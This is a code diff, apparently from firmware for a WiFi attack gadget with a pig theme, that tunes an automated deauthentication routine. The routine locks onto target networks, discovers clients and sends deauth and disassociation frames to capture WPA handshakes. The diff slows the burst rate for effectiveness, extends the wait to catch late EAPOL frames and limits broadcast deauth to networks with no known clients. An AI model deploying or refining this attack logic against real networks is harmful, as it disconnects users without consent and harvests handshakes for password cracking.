@@ -162,7 +162,7 @@ static uint32_t attackStartTime = 0;
 static const uint32_t SCAN_TIME = 5000;         // 5 sec initial scan
 // LOCK_TIME now uses SwineStats::getLockTime() for class buff support
 static const uint32_t ATTACK_TIMEOUT = 15000;   // 15 sec per target
-static const uint32_t WAIT_TIME = 2000;         // 2 sec between targets
+static const uint32_t WAIT_TIME = 4500;         // 4.5 sec between targets (allows late EAPOL M3/M4)
 static const uint32_t BORED_RETRY_TIME = 30000; // 30 sec between retry scans when bored
 static const uint32_t BORED_THRESHOLD = 3;      // Failed target attempts before bored
 
@@ -643,10 +643,10 @@ void OinkMode::update() {
                 deauthing = false;  // Don't deauth yet, just listen
                 channelHopping = false;  // Ensure channel stays locked during capture phase
                 
-                Serial.printf("[OINK] Locking to %s (ch%d) - discovering clients...\n", 
+                Serial.printf("[OINK] Locking to %s (ch%d) - discovering clients (12s window)...\n", 
                              networks[selectionIndex].ssid,
                              networks[selectionIndex].channel);
-                Mood::setStatusMessage("stalkin auths");
+                Mood::setStatusMessage("sniffin clients");
                 Avatar::sniff();  // Nose twitch when sniffing for auths
             }
             break;
@@ -674,8 +674,8 @@ void OinkMode::update() {
             break;
             
         case AutoState::ATTACKING:
-            // Send deauth burst every 100ms (more effective than single packets)
-            if (now - lastDeauthTime > 100) {
+            // Send deauth burst every 180ms (optimal rate per research - prevents queue saturation)
+            if (now - lastDeauthTime > 180) {
                 if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
                     DetectedNetwork* target = &networks[targetIndex];
                     
@@ -704,10 +704,12 @@ void OinkMode::update() {
                     }
                     
                     // PRIORITY 2: Broadcast deauth (less effective, but catches unknown clients)
-                    // Only send 1 broadcast per cycle to reduce noise
-                    sendDeauthFrame(target->bssid, broadcast, 7);
-                    sendDisassocFrame(target->bssid, broadcast, 8);  // Some devices respond to disassoc only
-                    deauthCount++;
+                    // Only send when no clients discovered - reduces noise pollution
+                    if (target->clientCount == 0) {
+                        sendDeauthFrame(target->bssid, broadcast, 7);
+                        sendDisassocFrame(target->bssid, broadcast, 8);  // Some devices respond to disassoc only
+                        deauthCount++;
+                    }
                     
                     lastDeauthTime = now;
                 }
